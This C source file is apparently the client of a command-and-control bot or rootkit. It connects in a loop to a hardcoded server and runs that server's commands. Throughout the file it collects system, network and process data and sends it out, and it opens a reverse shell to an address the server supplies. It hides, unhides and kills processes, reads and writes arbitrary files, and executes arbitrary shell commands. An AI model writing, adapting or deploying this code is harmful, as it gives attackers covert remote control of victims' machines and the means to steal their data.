#include <stdio.h>
#include <ifaddrs.h>
#include <stdlib.h>
#include <ctype.h>
#include <dirent.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <sys/wait.h>
#include <util.h>
#include <pickle.h>
#include <sock_client.h>

#define NI_MAXHOST 1025
#define CNC_SERVER "10.0.3.1"
#define CNC_PORT "4444"
#define SIGHIDE 4001
#define SIGUNHIDE 4002
#define SIGROOT 4003

int get_proc_ppid(int pid) {
    char path[60];
    char* res = NULL;
    int ppid;
    FILE* fpid;
    snprintf(path, 60, "/proc/%d/status", pid);
    fpid = fopen(path, "r");
    if(fpid != NULL) {
        seek_until(fpid, "PPid:", 5);
        dynamic_mem_fgets(fpid, &res);
        ppid = atoi(res);
        return ppid;
    }
    return 0;
}

char* get_proc_comm(int pid) {
    char path[60];
    char* res = NULL;
    FILE* fpid;
    snprintf(path, 60, "/proc/%d/comm", pid);
    fpid = fopen(path, "r");
    if(fpid != NULL) {
        dynamic_mem_fgets(fpid, &res);
        strip_endline(res);
        fclose(fpid);
    }
    return res;
}

int get_proc_cmdline(int pid, char* res, int len) {
    char path[60];
    FILE* fpid;
    int n = 0;
    snprintf(path, 60, "/proc/%d/cmdline", pid);
    fpid = fopen(path, "r");
    if(fpid != NULL) {
        n = ftell(fpid);
        fgets(res, len, fpid);
        n = ftell(fpid) - n;
        fclose(fpid);
    }
    return n;
}

struct p_data* show_proc(int pid) {
    int _pid, ppid;
    char* comm;
    char* _status;
    char path[60];
    FILE* p;
    char status;
    struct p_data* res;
    char cmdline[1024];
    int cmdline_len;
    //printf("PID = %d\n", pid);
    snprintf(path, 60, "/proc/%d/stat", pid);
    p = fopen(path, "r");
    if(p == NULL)
        return NULL;
    fscanf(p, "%d %*c%m[^\\)]%*c %c %d", &_pid, &comm, &status, &ppid);
    cmdline_len = get_proc_cmdline(pid, cmdline, 1023);
    switch(status) {
        case 'R':
            _status = "running";
            break;
        case 'S':
            _status = "sleeping";
            break;
        case 'D':
            _status = "disk running";
            break;
        case 'T':
            _status = "stopped";
            break;
        case 'Z':
            _status = "zombie";
            break;
        case 'X':
            _status = "dead";
            break;
        default :
            _status = "none";
    }
    //printf("'----> cmdline  = %s\n", cmdline);
    //printf("'----> commname = %s\n", comm);
    //printf("'----> PPID     = %d\n", ppid);
    //printf("'----> status   = %s %c\n", _status, status);
    res = _DICT(_KV(_STR("pid"), _INT(_pid)),
                _KV(_STR("cmdline"), _STR(cmdline, cmdline_len)),
                _KV(_STR("commname"), _STR(comm, strlen(comm))),
                _KV(_STR("status"), _STR(_status, strlen(_status))),
                _KV(_STR("ppid"), _INT(ppid)));
    free(comm);
    return res;
}
struct dynstr* proc_info() {
    DIR *proc;
    struct dirent *dir;
    struct p_data* procs;
    struct p_data* procinfo;
    struct llist* head;
    struct dynstr* hasil;
    proc = opendir("/proc");
    procs = build_empty_list();
    if(proc != NULL) {
        while((dir = readdir(proc)) != NULL) {
            if(is_strdigit(dir->d_name)) {
                // PID
                procinfo = show_proc(atoi(dir->d_name));
                if(procinfo != NULL) {
                    head = procs->data.d_list;
                    llist_add(head, procinfo);
                }
            }
        }
    }
    hasil = build_pickle(procs);
    //hexdump(hasil->data, hasil->len);
    p_data_free(procs);
    closedir(proc);
    return hasil;
}

struct p_data* if_info() {
    struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];
    struct p_data* dict;
    dict = build_empty_dict();
    if (getifaddrs(&ifaddr) == -1)
    {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }


    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
    {
        if (ifa->ifa_addr == NULL)
            continue;

        s = getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);

        if((ifa->ifa_addr->sa_family==AF_INET))
        {
            if (s != 0)
            {
                //printf("getnameinfo() failed: %s\n", gai_strerror(s));
                exit(EXIT_FAILURE);
            }
            //printf("\tInterface : <%s>\n",ifa->ifa_name );
            //printf("\t  Address : <%s>\n", host);
            p_dict_add(dict, _KV(_STR(ifa->ifa_name, strlen(ifa->ifa_name)), _STR(host, strlen(host))));
        }
    }
    freeifaddrs(ifaddr);
    return dict;
}

struct dynstr* sysinfo() {
    struct utsname uname_pointer;
    struct p_data* res;
    struct p_data* interface;
    struct dynstr* hasil;
    uname(&uname_pointer);
    res = _DICT(_KV(_STR("System name"),_STR(uname_pointer.sysname, strlen(uname_pointer.sysname))),
                _KV(_STR("Nodename"),_STR(uname_pointer.nodename, strlen(uname_pointer.nodename))),
                _KV(_STR("Release"),_STR(uname_pointer.release, strlen(uname_pointer.release))),
                _KV(_STR("Version"),_STR(uname_pointer.version, strlen(uname_pointer.version))),
                _KV(_STR("Machine"),_STR(uname_pointer.machine, strlen(uname_pointer.machine))),
                _KV(_STR("Domain name"),_STR(uname_pointer.__domainname, strlen(uname_pointer.__domainname))));
    interface = if_info();
    p_dict_add(res, _KV(_STR("Interface"), interface));
    hasil = build_pickle(res);
    p_data_free(res);
    return hasil;
}

int reverse_shell(const char* ip, const char* port) {
    int fd = tcp_client(ip, port, "err");
    int pid, status;
    if(fd < 0) return -1;
    pid = fork();
    if(pid == 0) {
        //printf("i'am child\n");
        dup2(fd, 0);
        dup2(fd, 1);
        dup2(fd, 2);
        printf("Enjoy the shell\n");
        execve("/bin/sh", 0, 0);
        exit(1);
        return 0;
    }
    //wait(&status);
    //printf("done\n");
    return 0;
}

int start_proc(const char* prog) {
    int devnull;
    int dup2Result;
    int pid;
    pid = fork();
    if(pid == 0) {
        devnull = open("/dev/null", O_WRONLY);
        if(devnull == -1){
            fprintf(stderr,"Error in open('/dev/null',0)\n");
            exit(EXIT_FAILURE);
        }
        //printf("In stdout\n");
        dup2Result = dup2(devnull, STDOUT_FILENO);
        if(dup2Result == -1) {
            fprintf(stderr,"Error in dup2(devNull, STDOUT_FILENO)\n");
            exit(EXIT_FAILURE);
        }
        dup2Result = dup2(devnull, STDIN_FILENO);
        if(dup2Result == -1) {
            fprintf(stderr,"Error in dup2(devNull, STDOUT_FILENO)\n");
            exit(EXIT_FAILURE);
        }
        dup2Result = dup2(devnull, STDERR_FILENO);
        if(dup2Result == -1) {
            fprintf(stderr,"Error in dup2(devNull, STDOUT_FILENO)\n");
            exit(EXIT_FAILURE);
        }
        execv(prog, 0);
        exit(1);
    }
    return pid;
}

int do_cmd(int fd, FILE* sockfd, const char* cmd) {
    int tmp;
    int devnull;
    struct dynstr* data;
    struct p_data* hasil;
    char ip[16];
    char port[5];
    char buf[8];
    char buf2[1024];
    char* isi;
    FILE* fp;
    //printf("%s\n", cmd);
    handle_cmd("NONE") {
        //printf("nothing\n");
    }
    handle_cmd("SYSINFO") {
        //printf("SYSINFO");
        data = sysinfo();
        sprintf(buf, "%d\n", data->len);
        //printf("%s", buf);
        write(fd, buf, strlen(buf));
        tmp = write(fd, data->data, data->len);
    }
    handle_cmd("PROCINFO") {
        //printf("PROCINFO");
        data = proc_info();
        sprintf(buf, "%d\n", data->len);
        //printf("%s", buf);
        write(fd, buf, strlen(buf));
        tmp = write(fd, data->data, data->len);
    }
    handle_cmd("SHELL") {
        fscanf(sockfd, "%16s", ip);
        fscanf(sockfd, "%4s", port);
        //printf("%s:%s\n", ip, port);
        tmp = reverse_shell(ip, port);
        if(tmp == -1)
            write(fd, "-1\n", 3);
        else {
            write(fd, "0\n", 2);
        }
    }
    handle_cmd("KILLPROC") {
        fscanf(sockfd, "%6s", buf);
        //printf("%s\n", buf);
        tmp = atoi(buf);
        kill(tmp, 9);
    }
    handle_cmd("HIDEPROC") {
        fscanf(sockfd, "%6s", buf);
        //printf("%s\n", buf);
        tmp = atoi(buf);
        kill(tmp, SIGHIDE);
    }
    handle_cmd("UNHIDEPROC") {
        fscanf(sockfd, "%6s", buf);
        //1458
        tmp = atoi(buf);
        kill(tmp, SIGUNHIDE);
    }
    handle_cmd("LOADFILE") {
        fscanf(sockfd, "%1023s", buf2);
        //printf("%s\n", buf2);
        fp = fopen(buf2, "r");
        if(fp == 0) {
            write(fd, "-1", 2);
            goto out;
        }
        fseek(fp, 0, SEEK_END);
        tmp = ftell(fp);  // Get file size
        fseek(fp, 0, SEEK_SET);
        //printf("size %d\n", tmp);
        sprintf(buf, "%d\n", tmp);
        write(fd, buf, strlen(buf));
        isi = malloc(tmp);
        if(isi) {
            fread(isi, 1, tmp, fp);
            write(fd, isi, tmp);
        }
        fclose(fp);
    }
    handle_cmd("PUTFILE") {
        fscanf(sockfd, "%1023s", buf2);
        fscanf(sockfd, "%d", &tmp);
        //printf("%s\n", buf2);
        //printf("%d\n", tmp);
        fp = fopen(buf2, "w+");
        if(fp == 0) {
            goto out;
        }
        isi = malloc(tmp);
        if(isi) {
            read(fd, isi, tmp);
            fwrite(isi, 1, tmp, fp);
        }
        fclose(fp);
    }
    handle_cmd("STARTPROC") {
        fscanf(sockfd, "%1023s", buf2);
        tmp = start_proc(buf2);
        sprintf(buf, "%d\n", tmp);
        write(fd, buf, strlen(buf));
    }
    handle_cmd("EXECSYS") {
        fscanf(sockfd, "%1023s", buf2);
        strcat(buf2, " > /dev/null 2>&1");
        system(buf2);
    }
out:
    fscanf(sockfd, "%s", buf);
    if(!strcmp(buf, "END")) {
        return 0;
    }
    //printf("%s\n", buf);
    return -1;
}

void start_bot() {
    char res[80];
    char cmd[13];
    FILE* sockfd;
    while(1) {
        int fd = tcp_client(CNC_SERVER, CNC_PORT, "connect error");
        if(fd < 0) {
            sleep(1);
            continue;
        }
        sockfd = fdopen(fd, "r+");
        setvbuf(sockfd, NULL, _IONBF, 0);
        fprintf(sockfd, "GETCMD\n");
        fscanf(sockfd, "%12s", cmd);
        do_cmd(fd, sockfd, cmd);
        sleep(1);
        fclose(sockfd);
    }
}

void _test() {
    struct p_data* ifinfo;
    struct dynstr* info;
    info = sysinfo();
    hexdump(info->data, info->len);
}

int main(void)
{
    start_bot();
}
